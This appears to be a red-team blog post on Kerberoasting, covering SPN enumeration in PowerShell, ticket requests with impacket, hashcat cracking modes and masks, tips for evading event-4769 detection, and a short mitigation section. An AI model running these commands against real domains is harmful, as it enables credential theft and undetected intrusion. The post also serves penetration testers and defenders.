---
layout: post
title: "notes on kerberoasting in a hardened AD"
date: 2026-08-02 11:00:00 -0300
author: v3lkro
tags: [active-directory, red-team, kerberos, post-exploitation]
lang: en
excerpt: "what kerberoasting actually buys you in 2026, when the trick still works, what defenders catch, and which RC4 mask cracks first."
---

Kerberoasting is ancient by red-team standards: 2014 paper, dozens of tools, every detection product knows the signature. In 2026 it still pays off in roughly 60-70% of the AD environments I've touched, because the underlying configuration mistake, a human-typed password on a service account with an SPN, outlives every detection cycle.

The trick still works the same way. What changed is the noise floor.

## the primitive

Anyone authenticated to the domain can request a Kerberos service ticket for any account with a `servicePrincipalName` set. The service ticket is encrypted with the service account's NTLM hash (RC4) or AES key. If the account is human-managed and the password is weak, you crack the ticket offline.

```powershell
# enumerate SPN-bearing user accounts (skip computer accounts: SamAccountName ends in $)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} `
    -Properties ServicePrincipalName, msDS-SupportedEncryptionTypes, PasswordLastSet |
    Where-Object { $_.SamAccountName -notlike "*$" } |
    Select SamAccountName, `
           @{n="SPN"; e={ $_.ServicePrincipalName -join "; " }}, `
           @{n="EncTypes"; e={ $_.'msDS-SupportedEncryptionTypes' }}, `
           PasswordLastSet
```

`msDS-SupportedEncryptionTypes` is the field worth staring at. The bitmask tells you what'll come back:

| bit | meaning                  |
|-----|--------------------------|
| 0x4 | RC4_HMAC_MD5             |
| 0x8 | AES128_CTS_HMAC_SHA1_96  |
| 0x10| AES256_CTS_HMAC_SHA1_96  |

If `EncTypes` is unset (`$null`) the DC negotiates per the `Domain Controller` policy, which historically means RC4 is still served. If `EncTypes` is `0x18` (AES-only) you get an AES ticket and your crack rate falls off a cliff.

## requesting the tickets

`GetUserSPNs.py` from impacket is still the right tool, it asks for a specific encryption type, so you can force RC4 for the cheap crack:

```text
$ GetUserSPNs.py -dc-ip 10.0.0.1 -request \
                 -outputfile spns-rc4.txt \
                 INFERI.local/lowpriv:'Password123!'

ServicePrincipalName        Name           MemberOf  PasswordLastSet      LastLogon            Delegation
MSSQLSvc/sql01:1433         svc_sql        ...       2018-03-12 ...                            unconstrained
HTTP/spbridge.inferi.local  svc_spbridge   ...       2024-11-04 ...                            none
HTTP/jenkins:8080           svc_jenkins    ...       2021-09-20 ...                            none
```

The dates are the giveaway. A `PasswordLastSet` from 2018 on a service account named `svc_sql` is a guarantee of a human-typed password, modern infrastructure rotates with gMSA every 30 days.

## cracking

RC4-HMAC tickets are `-m 13100` in hashcat; AES-256 is `-m 19700`. RC4 is two orders of magnitude faster, start there:

```bash
# RC4 first, RTX 4090 does ~3 GH/s
$ hashcat -m 13100 spns-rc4.txt rockyou.txt \
          -r rules/best64.rule \
          --status --status-timer=60

# fall back to AES-256 only for tickets that didn't crack as RC4
$ hashcat -m 19700 spns-aes.txt rockyou.txt \
          -r rules/best64.rule
```

`Password123!` and its variants land in the first three minutes. Anything more interesting needs targeted masks, for service accounts I find `?u?l?l?l?l?l?d?d?d?d` (year-suffix Camelcased word) hits a depressing fraction:

```bash
$ hashcat -m 13100 spns-rc4.txt -a 3 '?u?l?l?l?l?l?d?d?d?d'
```

## what detection actually catches

The bog-standard rule shipped by every EDR/SIEM looks for **4769** events (Kerberos service ticket requested) with `Ticket Encryption Type = 0x17` (RC4) on a domain where AES is supposed to be enforced. That fires hard if you request 200 SPNs in a row, because no real user does that. Three ways operators dodge it:

- Request **one at a time, with delays**, only for SPNs whose `EncTypes` indicates RC4 is the negotiated default anyway. Then your 4769 looks like every other RC4 ticket the DC is already minting all day.
- Use the **AES path** (`-outputfile spns-aes.txt` without `-usersfile`) and accept the lower crack rate.
- Roast from a host whose user normally hits a lot of SPNs (jump boxes, monitoring service accounts). The volume blends in.

## mitigation, briefly

If you found this post because a red-teamer just ate your environment: the fix is gMSA or PMSA for every service account, and a registry policy that disables RC4 (`KrbtgtTrustedForDelegation` is a different lever; you want `Network security: Configure encryption types allowed for Kerberos` set to AES-only). Long passwords on the remaining human-managed accounts are a stopgap, not a cure.

Kerberoasting is still alive in 2026 not because the protocol is broken but because someone, somewhere, typed `Welcome2024!` on a service account in 2024 and that account still exists.